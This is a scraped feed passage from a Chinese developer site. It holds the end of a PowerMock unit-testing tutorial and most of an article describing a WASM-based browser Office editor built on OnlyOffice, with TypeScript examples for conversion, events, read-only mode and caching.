        <span class="hljs-comment">// 3. 预设方法行为</span>
        PowerMockito.when(mockConnection.execute(Mockito.anyString())).thenReturn(<span class="hljs-literal">true</span>);
        
        <span class="hljs-comment">// 4. 执行测试</span>
        <span class="hljs-type">UserRepository</span> <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserRepository</span>();
        <span class="hljs-type">boolean</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> repository.saveUser(<span class="hljs-string">"testuser"</span>);
        
        <span class="hljs-comment">// 5. 验证</span>
        assertTrue(result);
        PowerMockito.verifyNew(DatabaseConnection.class)
                   .withArguments(<span class="hljs-string">"jdbc:mysql://localhost:3306/test"</span>);
    }
}
</code></pre>
<p><strong>关键点说明</strong>：</p>
<ul>
<li><code>whenNew()</code>用于拦截构造函数调用。</li>
<li><code>withParameterTypes()</code>和<code>withArguments()</code>用于精确匹配构造函数。</li>
<li>需要使用<code>verifyNew()</code>验证构造函数调用。</li>
</ul>
<p><strong>应用场景</strong>：适用于测试遗留代码中在方法内部直接实例化依赖对象的情况。</p>
<h3 data-id="heading-12">静态代码块处理</h3>
<p>静态代码块在类加载时执行，可能包含不愿在测试中运行的代码（如初始化昂贵资源），PowerMock可以抑制静态代码块的执行。</p>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigurationLoader</span> {
    <span class="hljs-keyword">static</span> {
        <span class="hljs-comment">// 静态代码块，可能包含昂贵的初始化操作</span>
        loadConfigurationFromRemote();
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadConfigurationFromRemote</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 模拟昂贵的初始化</span>
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">"不应该在测试中执行"</span>);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getConfig</span><span class="hljs-params">(String key)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"value"</span>;
    }
}
</code></pre>
<p><strong>测试代码</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RunWith(PowerMockRunner.class)</span>
<span class="hljs-meta">@PrepareForTest(ConfigurationLoader.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigurationLoaderTest</span> {
    
    <span class="hljs-meta">@Test</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testSuppressStaticInitializer</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 抑制静态代码块执行</span>
        PowerMockito.suppress(PowerMockito.method(ConfigurationLoader.class, <span class="hljs-string">"loadConfigurationFromRemote"</span>));
        
        <span class="hljs-comment">// 现在可以安全测试，静态代码块不会执行</span>
        assertNotNull(ConfigurationLoader.getConfig(<span class="hljs-string">"testkey"</span>));
    }
}
</code></pre>
<h2 data-id="heading-13">PowerMock最佳实践与注意事项</h2>
<h3 data-id="heading-14">谨慎使用PowerMock</h3>
<p>虽然PowerMock功能强大，但过度使用可能是代码设计问题的信号。<strong>以下是一些使用原则</strong>：</p>
<ul>
<li><strong>优先考虑重构</strong>：如果代码中大量使用PowerMock，应该考虑重构代码以提高可测试性。例如，将静态方法改为实例方法，通过依赖注入解耦等。</li>
<li><strong>仅用于遗留代码</strong>：在新项目中，优先通过良好设计避免使用PowerMock，仅在处理难以修改的遗留代码时大量使用。</li>
<li><strong>隔离使用</strong>：将使用PowerMock的测试类单独放置，防止影响其他测试的执行效率。</li>
</ul>
<h3 data-id="heading-15">性能优化建议</h3>
<p>PowerMock由于使用自定义类加载器和字节码操作，会对测试执行时间产生显著影响。以下是一些优化建议：</p>
<ul>
<li><strong>最小化@PrepareForTest</strong>：只将确实需要Mock的类放入注解中，减少字节码操作的范围。</li>
<li><strong>合理使用Mockito</strong>：对于常规Mock场景，仍然使用Mockito，仅在必要时使用PowerMock。</li>
<li><strong>避免过度Mock</strong>：不要Mock系统类或简单值对象，这会给测试带来不必要的复杂性。</li>
</ul>
<h3 data-id="heading-16">版本选择与兼容性</h3>
<p><strong>版本兼容性</strong>：PowerMock与Mockito、JUnit的版本兼容性非常重要。以下是推荐组合：</p>
<ul>
<li>PowerMock 2.x + Mockito 2.x + JUnit 4.12+</li>
<li>避免混合使用不兼容的版本</li>
</ul>
<p><strong>JUnit 5支持</strong>：截至目前，PowerMock不支持JUnit 5，这是选择测试框架时需要考虑的因素。</p>
<h3 data-id="heading-17">常见问题排查</h3>
<p><strong>类加载器冲突</strong>：使用<code>@PowerMockIgnore</code>注解排除冲突的包。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PowerMockIgnore({"javax.management.*", "javax.net.ssl.*"})</span>
</code></pre>
<p><strong>版本冲突</strong>：确保所有Mock相关库的版本兼容。</p>
<p><strong>静态方法验证失败</strong>：记住每次验证静态方法调用时都要先调用<code>verifyStatic()</code>。</p>
<h2 data-id="heading-18">总结</h2>
<p>PowerMock解决了传统Mock框架无法处理的棘手问题。通过字节码操作技术，PowerMock能够Mock静态方法、final类、私有方法和构造函数等"不可Mock"的元素。</p>
<p><strong>核心价值</strong>：</p>
<ul>
<li>填补了Mockito的功能空白，完善了Java单元测试的工具链。</li>
<li>特别适用于处理遗留代码和第三方库的测试问题。</li>
<li>通过提高代码覆盖率来提升软件质量。</li>
</ul>
<p><strong>适用边界</strong>：</p>
<ul>
<li>不是所有场景都适合使用PowerMock，新项目应优先考虑良好的代码设计。</li>
<li>在测试性能和代码可维护性之间需要权衡。</li>
<li>建议将使用范围控制在确实必要的复杂场景中。</li>
</ul>
<p>希望本文能帮助你在实际项目中更好地使用PowerMock。如果你有任何问题或经验分享，欢迎在评论区留言交流！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于WASM的纯前端Office解决方案：在线编辑/导入导出/权限切换（已开源）]]></title>    <link>https://juejin.cn/post/7575425466904723519</link>    <guid>https://juejin.cn/post/7575425466904723519</guid>    <pubDate>2025-11-23T08:32:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575425466904723519" data-draft-id="7575425466904690751" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于WASM的纯前端Office解决方案：在线编辑/导入导出/权限切换（已开源）"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-23T08:32:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Electrolux"/> <meta itemprop="url" content="https://juejin.cn/user/3004311888208296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于WASM的纯前端Office解决方案：在线编辑/导入导出/权限切换（已开源）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3004311888208296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Electrolux
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:32:31.000Z" title="Sun Nov 23 2025 08:32:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">效果展示</h2>
<p>所有操作均在浏览器进行，先来看看最终效果：</p>
<p>🌐 <strong>在线演示</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Fmvp-onlyoffice.vercel.app%2F" target="_blank" title="https://mvp-onlyoffice.vercel.app/" ref="nofollow noopener noreferrer">mvp-onlyoffice.vercel.app/</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cc97b2347465410184d7b237954a61bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRWxlY3Ryb2x1eA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491695&amp;x-signature=J3BA0nQbpFpxQGMHFE5DLw59lks%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">核心功能演示</h3>
<ul>
<li>✅ <strong>文档上传</strong>：支持本地文件直接上传</li>
<li>✅ <strong>实时编辑</strong>：流畅的文档编辑体验</li>
<li>✅ <strong>格式转换</strong>：基于WASM的文档格式转换</li>
<li>✅ <strong>导出保存</strong>：一键导出编辑后的文档</li>
<li>✅ <strong>模式切换</strong>：只读/可编辑模式自由切换</li>
<li>✅ <strong>多语言支持</strong>：中英文界面无缝切换</li>
</ul>
<h2 data-id="heading-2">技术架构</h2>
<h3 data-id="heading-3">核心技术栈</h3>
<ul>
<li><strong>React 19</strong> + <strong>Next.js 15</strong>：现代化前端框架</li>
<li><strong>OnlyOffice SDK</strong>：官方JavaScript SDK，提供文档编辑核心能力</li>
<li><strong>WebAssembly (x2t-wasm)</strong>：文档格式转换引擎</li>
<li><strong>TypeScript</strong>：类型安全的开发体验</li>
<li><strong>EventBus</strong>：事件驱动的架构设计</li>
<li><strong>IndexedDB</strong>：WASM文件缓存优化</li>
</ul>
<p>tip: 事实上不依赖于 react，你可以拿到 项目中的 src/onlyoffice-comp ,然后接入到任何系统中去，接入层可以参考 <code>src/app/excel/page.tsx</code>等应用层文件</p>
<h3 data-id="heading-4">架构流程图</h3>
<pre><code class="hljs language-scss" lang="scss">用户上传文档
    ↓
React组件层
    ↓
EditorManager (编辑器管理器)
    ↓
X2T Converter (WASM转换器)
    ↓
OnlyOffice SDK (文档编辑器)
    ↓
EventBus (事件总线)
    ↓
导出/保存文档
</code></pre>
<h2 data-id="heading-5">WASM文档转换核心流程</h2>
<h3 data-id="heading-6">转换流程图解</h3>
<pre><code class="hljs language-markdown" lang="markdown">用户选择文件
<span class="hljs-code">    ↓
浏览器读取文件
    ↓
WASM虚拟文件系统
    ↓
X2T引擎执行转换
    ↓
生成二进制数据 + 媒体资源
    ↓
OnlyOffice编辑器加载
</span></code></pre>
<h3 data-id="heading-7">核心代码实现</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/onlyoffice-comp/lib/x2t.ts</span>

<span class="hljs-comment">/**
 * X2T 工具类 - 负责文档转换功能
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">X2TConverter</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">x2tModule</span>: <span class="hljs-title class_">EmscriptenModule</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  
  <span class="hljs-comment">// 支持的文件类型映射</span>
  <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> <span class="hljs-attr">DOCUMENT_TYPE_MAP</span>: <span class="hljs-title class_">Record</span>&lt;<span class="hljs-built_in">string</span>, <span class="hljs-title class_">DocumentType</span>&gt; = {
    <span class="hljs-attr">docx</span>: <span class="hljs-string">'word'</span>,
    <span class="hljs-attr">doc</span>: <span class="hljs-string">'word'</span>,
    <span class="hljs-attr">odt</span>: <span class="hljs-string">'word'</span>,
    <span class="hljs-attr">rtf</span>: <span class="hljs-string">'word'</span>,
    <span class="hljs-attr">txt</span>: <span class="hljs-string">'word'</span>,
    <span class="hljs-attr">xlsx</span>: <span class="hljs-string">'cell'</span>,
    <span class="hljs-attr">xls</span>: <span class="hljs-string">'cell'</span>,
    <span class="hljs-attr">ods</span>: <span class="hljs-string">'cell'</span>,
    <span class="hljs-attr">csv</span>: <span class="hljs-string">'cell'</span>,
    <span class="hljs-attr">pptx</span>: <span class="hljs-string">'slide'</span>,
    <span class="hljs-attr">ppt</span>: <span class="hljs-string">'slide'</span>,
    <span class="hljs-attr">odp</span>: <span class="hljs-string">'slide'</span>,
  };

  <span class="hljs-comment">/**
   * 转换文档格式
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">convertDocument</span>(<span class="hljs-attr">file</span>: <span class="hljs-title class_">File</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">ConversionResult</span>&gt; {
    <span class="hljs-comment">// 初始化WASM模块</span>
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">ensureReady</span>();
    
    <span class="hljs-comment">// 写入虚拟文件系统</span>
    <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> file.<span class="hljs-title function_">arrayBuffer</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">x2tModule</span>!.<span class="hljs-property">FS</span>.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">'/working/origin'</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(data));
    
    <span class="hljs-comment">// 执行C++编译的转换模块</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">executeConversion</span>(<span class="hljs-string">'/working/params.xml'</span>);
    
    <span class="hljs-comment">// 提取转换结果和媒体文件</span>
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">bin</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">x2tModule</span>!.<span class="hljs-property">FS</span>.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">'/working/output.bin'</span>),
      <span class="hljs-attr">media</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">collectMediaFiles</span>() <span class="hljs-comment">// 提取图片等资源</span>
    };
  }
}
</code></pre>
<h2 data-id="heading-8">编辑器管理器：Proxy模式的安全封装</h2>
<p>项目采用Proxy模式对OnlyOffice编辑器实例进行安全封装，提供统一的API接口：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/onlyoffice-comp/lib/editor-manager.ts</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">EditorManager</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">editor</span>: <span class="hljs-title class_">DocEditor</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>;
  
  <span class="hljs-comment">// 使用 Proxy 提供安全的访问接口</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">createProxy</span>(): <span class="hljs-title class_">DocEditor</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>({} <span class="hljs-keyword">as</span> <span class="hljs-title class_">DocEditor</span>, {
      <span class="hljs-attr">get</span>: <span class="hljs-function">(<span class="hljs-params">_target, prop</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">'destroyEditor'</span>) {
          <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">destroy</span>();
        }
        <span class="hljs-keyword">if</span> (prop === <span class="hljs-string">'sendCommand'</span>) {
          <span class="hljs-keyword">return</span> <span class="hljs-function">(<span class="hljs-params">params</span>) =&gt;</span> {
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">editor</span>) {
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">editor</span>.<span class="hljs-title function_">sendCommand</span>(params);
            }
          };
        }
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">editor</span> ? (<span class="hljs-variable language_">this</span>.<span class="hljs-property">editor</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)[prop] : <span class="hljs-literal">undefined</span>;
      },
    });
  }
  
  <span class="hljs-comment">// 导出文档（事件驱动）</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">export</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">SaveDocumentData</span>&gt; {
    <span class="hljs-keyword">const</span> editor = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">get</span>();
    <span class="hljs-keyword">if</span> (!editor) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Editor not available'</span>);
    }
    
    <span class="hljs-comment">// 触发保存</span>
    (editor <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>).<span class="hljs-title function_">downloadAs</span>();
    
    <span class="hljs-comment">// 等待保存事件</span>
    <span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> onlyofficeEventbus.<span class="hljs-title function_">waitFor</span>(
      <span class="hljs-variable constant_">ONLYOFFICE_EVENT_KEYS</span>.<span class="hljs-property">SAVE_DOCUMENT</span>, 
      <span class="hljs-number">10000</span>
    );
    
    <span class="hljs-keyword">return</span> result;
  }
}
</code></pre>
<h2 data-id="heading-9">事件驱动架构：EventBus解耦设计</h2>
<p>项目采用事件总线机制，实现组件间的松耦合通信：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/onlyoffice-comp/lib/eventbus.ts</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">EventBus</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">listeners</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">EventKey</span>, <span class="hljs-title class_">Array</span>&lt;<span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>&gt;&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
  
  <span class="hljs-comment">// 监听事件</span>
  on&lt;K <span class="hljs-keyword">extends</span> <span class="hljs-title class_">EventKey</span>&gt;(<span class="hljs-attr">key</span>: K, <span class="hljs-attr">callback</span>: <span class="hljs-function">(<span class="hljs-params">data: EventDataMap[K]</span>) =&gt;</span> <span class="hljs-built_in">void</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">has</span>(key)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">set</span>(key, []);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">listeners</span>.<span class="hljs-title function_">get</span>(key)!.<span class="hljs-title function_">push</span>(callback);
  }
  
  <span class="hljs-comment">// 等待事件触发（返回 Promise）</span>
  waitFor&lt;K <span class="hljs-keyword">extends</span> <span class="hljs-title class_">EventKey</span>&gt;(<span class="hljs-attr">key</span>: K, timeout?: <span class="hljs-built_in">number</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">EventDataMap</span>[K]&gt; {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> timeoutId = timeout
        ? <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">off</span>(key, handleEvent);
            <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Event <span class="hljs-subst">${key}</span> timeout after <span class="hljs-subst">${timeout}</span>ms`</span>));
          }, timeout)
        : <span class="hljs-literal">null</span>;

      <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleEvent</span> = (<span class="hljs-params">data: EventDataMap[K]</span>) =&gt; {
        <span class="hljs-keyword">if</span> (timeoutId) <span class="hljs-built_in">clearTimeout</span>(timeoutId);
        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">off</span>(key, handleEvent);
        <span class="hljs-title function_">resolve</span>(data);
      };

      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">on</span>(key, handleEvent);
    });
  }
}
</code></pre>
<h3 data-id="heading-10">支持的事件类型</h3>
<ul>
<li><code>saveDocument</code> - 文档保存完成事件</li>
<li><code>documentReady</code> - 文档加载就绪事件</li>
<li><code>loadingChange</code> - 加载状态变化事件</li>
</ul>
<h2 data-id="heading-11">核心功能特性</h2>
<h3 data-id="heading-12">1. 国际化支持</h3>
<p>项目内置多语言支持，可自由切换中英文界面：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 切换语言</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLanguageSwitch</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> newLang = currentLang === <span class="hljs-string">'zh'</span> ? <span class="hljs-string">'en'</span> : <span class="hljs-string">'zh'</span>;
  <span class="hljs-title function_">setCurrentLang</span>(newLang);
  
  <span class="hljs-comment">// 如果编辑器已存在，重新创建以应用新语言</span>
  <span class="hljs-keyword">if</span> (editorManager.<span class="hljs-title function_">exists</span>()) {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">handleView</span>(fileName, file);
  }
};
</code></pre>
<h3 data-id="heading-13">2. 导入导出功能</h3>
<p>完整的文档导入导出能力：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 导出文档</span>
<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> editorManager.<span class="hljs-title function_">export</span>();
<span class="hljs-comment">// result 包含: { fileName, fileType, binData, media }</span>

<span class="hljs-comment">// 转换并下载</span>
<span class="hljs-keyword">const</span> buffer = <span class="hljs-keyword">await</span> <span class="hljs-title function_">convertBinToDocument</span>(
  result.<span class="hljs-property">binData</span>, 
  result.<span class="hljs-property">fileName</span>,
  <span class="hljs-variable constant_">FILE_TYPE</span>.<span class="hljs-property">XLSX</span>, 
  result.<span class="hljs-property">media</span>
);

<span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>([buffer.<span class="hljs-property">data</span>], {
  <span class="hljs-attr">type</span>: <span class="hljs-string">'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'</span>
});
<span class="hljs-comment">// 执行下载操作</span>
</code></pre>
<h3 data-id="heading-14">3. 只读/可编辑模式切换</h3>
<p>灵活的权限控制，支持动态切换编辑模式：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 设置为只读模式</span>
<span class="hljs-keyword">await</span> editorManager.<span class="hljs-title function_">setReadOnly</span>(<span class="hljs-literal">true</span>);

<span class="hljs-comment">// 切换为可编辑模式</span>
<span class="hljs-keyword">await</span> editorManager.<span class="hljs-title function_">setReadOnly</span>(<span class="hljs-literal">false</span>);

<span class="hljs-comment">// 查询当前模式</span>
<span class="hljs-keyword">const</span> isReadOnly = editorManager.<span class="hljs-title function_">getReadOnly</span>();
</code></pre>
<p><strong>实现原理</strong>：</p>
<ul>
<li>从只读切换到可编辑：重新创建编辑器实例</li>
<li>从可编辑切换到只读：使用<code>processRightsChange</code>命令</li>
</ul>
<h3 data-id="heading-15">4. IndexedDB缓存优化</h3>
<p>使用IndexedDB缓存WASM文件，大幅提升二次加载速度：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 拦截 fetch，缓存 WASM 文件到 IndexedDB</span>
<span class="hljs-keyword">private</span> <span class="hljs-title function_">interceptFetch</span>(): <span class="hljs-built_in">void</span> {
  <span class="hljs-keyword">const</span> originalFetch = <span class="hljs-variable language_">window</span>.<span class="hljs-property">fetch</span>;
  
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">fetch</span> = <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">input: RequestInfo | URL</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">Response</span>&gt; {
    <span class="hljs-comment">// 先尝试从缓存读取</span>
